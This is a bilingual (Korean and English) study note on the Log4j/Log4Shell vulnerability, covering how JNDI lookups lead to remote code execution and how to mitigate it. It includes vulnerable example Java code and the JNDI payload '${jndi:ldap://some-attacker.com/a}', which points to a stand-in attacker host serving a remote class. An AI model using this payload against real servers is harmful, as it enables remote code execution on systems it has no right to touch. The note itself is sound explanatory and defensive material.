@@ -1,0 +1,109 @@
+## Log4j 개념 설명과 Log4j가 보안 위험에 노출된 이유
+
+> Apache Log4j2 versions 2.0-beta7 through 2.17.0 are vulnerable to a **remote code execution(RCE) attack** where an attacker with permission to modify the logging configuration file can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is fixed by limiting JDNI data source names to th java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2
+> 
+
+Log4j는
+
+- JAVA 기반 오픈소스 유틸리티로 엔터프라이즈 애플리케이션과 웹사이트에서 많이 사용된다.
+- 서비스 동작 과정에서 일어나는 모든 기록을 남긴다.
+- 침해 사고 발생 및 이상 징후를 점검하기 위해 Log4j를 이용한다.
+
+이번 Log4j 취약점은 JNDI (Java Naming Directory Interface)와 LDAP (Lightweight Directory Access Protocol)에서 시작한다. 
+
+- JNDI : JAVA  프로그램이 디렉토리를 통해 데이터를 찾을 수 있는 다양한 디렉토리 서비스 Interface를 제공한다. 그중 하나가 LDAP
+- Java 프로그램들은 JDNI와 LDAP를 통해 Java 객체를 찾을 수 있다.
+- 여기서 문제는 Log4j에 이를 이용하여 편하게 Java 객체를 볼 수 있게하는 특정 문법이 존재한다는 것이다.
+- 이 문법들은 로그가 기록될 때도 사용이 가능하다. 해커들은 로그가 기록되는 곳을 찾아 취약점을 이용할 수 있게 된다.
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa000d09-d02e-438a-b350-55f63b79fe58/Untitled.png)
+
+## 해결 방법
+
+- 가장 확실한 조치는 log4j 라이브러리를 2.15 이상으로 업데이트 하는 것이다.
+- 그러나 단 기간에 라이브러리를 업데이트하고 재검증하기 어려울 경우, 다음과 같은 선제 조치를 취한다.
+
+**1) JndiLookup을 log4j-core에서 제거**
+
+- 라이브러리 경로에서 아래 명령을 실행하면 JndiLookup.class가 제거된다.
+
+```sql
+zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+```
+
+**2) JVM 옵션으로 JndiLookup 기능을 제한하는 방법**
+
+: -Dlog4j2.formatMsgNoLookups=true 옵션과 함께 애플리케이션을 실행한다. 
+
+```bash
+java -Dlog4j2.formatMsgNoLookups=true -jar myapp.jar
+```
+
+
+
+## How the exploit works
+
+### Exploit Requirements
+
+- A server with a vulnerable log4j version
+- An endpoint with any protocol (HTTP, TCP, etc), that allows an attacker to send the exploit string.
+- A log statement that logs out the string from that request.
+
+### Example Vulnerable Code
+
+```java
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+import java.io.*;
+import java.sql.SQLException;
+import java.util.*;
+
+public class VulnerableLog4jExampleHandler implements HttpHandler {
+
+  static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());
+
+  /**
+   * A simple HTTP endpoint that reads the request's x-api-version header and logs it back.
+   * This is pseudo-code to explain the vulnerability, and not a full example.
+   * @param he HTTP Request Object
+   */
+  public void handle(HttpExchange he) throws IOException {
+    String apiVersion = he.getRequestHeader("X-Api-Version");
+
+    // This line triggers the RCE by logging the attacker-controlled HTTP header.
+    // The attacker can set their X-Api-Version header to: ${jndi:ldap://some-attacker.com/a}
+    log.info("Requested Api Version:{}", apiVersion);
+
+    String response = "<h1>Hello from: " + apiVersion + "!</h1>";
+    he.sendResponseHeaders(200, response.length());
+    OutputStream os = he.getResponseBody();
+    os.write(response.getBytes());
+    os.close();
+  }
+}
+```
+
+- 다음과 같은 요청을 보냄
+
+```bash
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
+```
+
+### Exploit Steps
+
+1. Data from the User gets sent to the server (via any protocol).
+2. logs the data containing the malicious payload from the request `${jndi:ldap://some-attacker.com/a}`, where `some-attacker.com` is an attacker controlled server.
+3. The log4j vulnerability is triggered by this payload and the server makes a request to `some-attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI).
+4. This response contains a path to a remote Java class file (ex. `http://second-stage.some-attacker.com/Exploit.class`), which is injected into the server process.
+5. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
+
+## 참고 자료
+
+[https://www.whatap.io/ko/blog/100/](https://www.whatap.io/ko/blog/100/)
+
+[https://logging.apache.org/log4j/2.x/security.html](https://logging.apache.org/log4j/2.x/security.html)
+
+[https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance)
+
+[https://www.lunasec.io/docs/blog/log4j-zero-day/](https://www.lunasec.io/docs/blog/log4j-zero-day/)
